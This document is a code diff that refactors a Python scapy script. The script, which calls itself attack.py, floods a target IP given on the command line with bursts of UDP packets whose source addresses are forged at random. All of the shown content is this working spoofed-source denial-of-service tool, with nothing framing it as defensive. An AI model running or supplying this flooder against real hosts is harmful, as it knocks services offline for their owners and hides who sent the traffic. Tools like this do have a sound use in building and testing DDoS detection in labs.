@@ -7,50 +7,40 @@ from scapy.all import sendp, IP, UDP, Ether, TCP
 from random import randrange
 import time
 
-#this function generates random IP addresses
-def sourceIPgen():
+def generateSourceIP():
+    not_valid = [10,127,254,255,1,2,169,172,192]
 
-#these values are not valid for first octet of IP address
-
-  not_valid = [10,127,254,255,1,2,169,172,192]
-
-  first = randrange(1,256)
-
-  while first in not_valid:
     first = randrange(1,256)
-    print first
-  ip = ".".join([str(first),str(randrange(1,256)), str(randrange(1,256)),str(randrange(1,256))])
-  print ip
-  return ip
+
+    while first in not_valid:
+        first = randrange(1,256)
+        #print first
+
+    ip = ".".join([str(first), str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256))])
+    #print ip
+    return ip
 
 
 def main():
-  for i in range (1,5):
-    mymain()
-    time.sleep (10)
-#send the generated IPs 
-def mymain():
+    for i in range (1,5):
+        launchAttack()
+        time.sleep (10)
 
-#getting the ip address to send attack packets 
-  dstIP = sys.argv[1:]
-  print dstIP
-  src_port = 80
-  dst_port = 1
+def launchAttack():
+  #eg, python attack.py 10.0.0.64
+  #destinationIP = 10.0.0.64
+  destinationIP = sys.argv[1:]
+  #print destinationIP
 
-# open interface eth0 to send packets
   interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
 
   for i in xrange(0,500):
-# form the packet
-    packets = Ether()/IP(dst=dstIP,src=sourceIPgen())/UDP(dport=dst_port,sport=src_port)
-    print(repr(packets))
+    packets = Ether() / IP( dst = destinationIP, src = generateSourceIP() ) / UDP( dport = 1, sport = 80 )
+    print( repr(packets) )
 
-# send packet with the defined interval (seconds) 
-    sendp( packets,iface=interface.rstrip(),inter=0.025)
+    #send packets with interval = 0.025 s
+    sendp( packets, iface = interface.rstrip(), inter = 0.025 )
 
-#main
 if __name__=="__main__":
   main()
-
-                                                                                                                                     
-                                                                                                                                                                                                  
+                                                                                                                                                                                                                                                                                                       
